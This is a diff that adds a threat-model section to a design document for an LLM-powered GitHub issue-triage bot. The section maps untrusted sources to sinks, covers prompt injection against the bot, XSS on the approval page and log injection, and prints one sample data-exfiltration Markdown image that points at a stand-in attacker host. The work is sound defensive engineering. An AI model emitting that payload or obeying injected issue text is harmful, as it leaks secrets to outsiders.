@@ -475,6 +475,70 @@ Reporter opens issue ──► GitHub ──POST /webhook {action: "opened", iss
 | Untrusted code execution from the public internet | R4 disabled in the demo, or runs only on preset sample issues |
 | Abusive or oversized input | Input length limits + moderation check (§5.1) |
 
+### 5.5 Threat model
+
+**Method:** list untrusted *sources*, list *sinks* (where data is executed, displayed, posted, stored or interpreted), trace sources to sinks, and at each sink ask "if the attacker fully controlled this text, what could it do here?". Then check STRIDE and the OWASP Top 10 for LLM Applications for missed categories. **Re-run whenever a new source or sink is added.**
+
+**Principles**
+- **Allowlists over denylists** — define what is allowed; removes whole categories, including attacks nobody has thought of yet.
+- **Defence in depth** — assume a layer will fail; the next one must catch it.
+- **Least privilege** — the LLM holds no credentials and no write tools.
+- **Every guardrail gets a test**; attack cases live in the eval set (prompt-injection pass rate).
+
+#### Untrusted sources
+| Source | Why untrusted |
+|---|---|
+| Issue title, body | Written by anyone on the internet |
+| Issue author | Comes from the request |
+| Webhook payload | Anyone can POST to the URL until the signature is verified |
+| Retrieved past issues (R2) | Written by strangers, possibly long ago |
+| Sandbox output (R4) | Produced by attacker-influenced code |
+| **LLM output** | Its input contained untrusted text, so its output is untrusted too |
+| Maintainer-edited text (R6) | Trusted person, but free text going into a public comment |
+
+#### Sinks
+| Sink | Interprets | Possible attack | Defence | Status |
+|---|---|---|---|---|
+| LLM prompt | Instructions | Prompt injection; closing delimiter tags early | Delimiters + regex tag sanitising + system-prompt rule; no write tools; HITL | ✅ slice 1 |
+| GitHub comment | Markdown (`@mentions`, links, images) | Mass notifications, phishing links, tracking images | Templates never quote user text (tested); R5 URL allowlist; HITL | ✅ templates / ⏳ R5 |
+| GitHub labels | Label names | Invented labels | Only labels from a fixed list | ⏳ slice 3 |
+| Sandbox | Code | Secret theft, network abuse, resource exhaustion, escape | Sandbox hardening (R4) | ⏳ slice 8 |
+| Logs and traces | Text, newlines | Leaked secrets; forged log lines (log injection) | Redaction; structured (JSON) logging with user text as fields | ⏳ Week 3 |
+| **Approval web page** | **HTML / JavaScript** | **XSS** — script runs in the maintainer's logged-in browser and can approve drafts | Jinja2 autoescaping on; never `\|safe` on user text; sanitise any rendered Markdown | ⏳ slice 7 |
+| Database | SQL | SQL injection | Parameterised queries only | ⏳ slice 5 |
+| Embeddings index | Similarity | Planted issues surfacing in search | Retrieved text treated as data; HITL | ⏳ slice 5 |
+
+**Found by this method (not covered earlier):**
+- **XSS in the approval page** — new HTML sink in slice 7.
+- **Data exfiltration via Markdown images** — `![x](https://evil.example/?d=SECRET)` sends data when the comment renders. Already blocked by the R5 URL allowlist (because it's an allowlist).
+- **Log injection** — newlines in a title forge log lines. Fixed by structured logging in Week 3.
+
+#### Attacker goals (for prioritising)
+Spam/harass under the project's name · phishing links · steal secrets · manipulate labels or close competitors' issues · run up costs · take over a maintainer account (XSS) · embarrass the project.
+
+#### STRIDE
+| Threat | Example | Defence |
+|---|---|---|
+| **S**poofing | Fake webhook; fake approver | HMAC signature check; GitHub OAuth + maintainer permission check |
+| **T**ampering | Issue edited after the draft was made | Stale-draft check on `updated_at` |
+| **R**epudiation | "I never approved that" | `Decision` audit record |
+| **I**nformation disclosure | Secrets in sandbox output, logs, traces | No secrets in sandbox/state; redaction |
+| **D**enial of service | Huge issues, issue floods, fork bombs | Truncation, rate limits, budget + kill switch, sandbox limits |
+| **E**levation of privilege | XSS → maintainer powers; injection → bot actions | Autoescaping; no LLM write tools; HITL |
+
+#### OWASP Top 10 for LLM Applications (2025)
+| Risk | Where handled |
+|---|---|
+| Prompt injection | Delimiters, system prompt, no write tools, HITL |
+| Sensitive information disclosure | No secrets in sandbox/state; redaction |
+| Supply chain | Pinned images, no runtime `pip install`, `uv.lock` |
+| Improper output handling | Citation/URL checks, `Literal` types, evidence checks |
+| Excessive agency | One agent, two tools, no write tools |
+| System prompt leakage | Prompts contain nothing secret |
+| Vector and embedding weaknesses | Retrieved issues treated as untrusted |
+| Misinformation | Grounding, citations, HITL |
+| Unbounded consumption | Truncation, rate limits, budget, kill switch |
+
 ---
 
 ## 6. Open questions
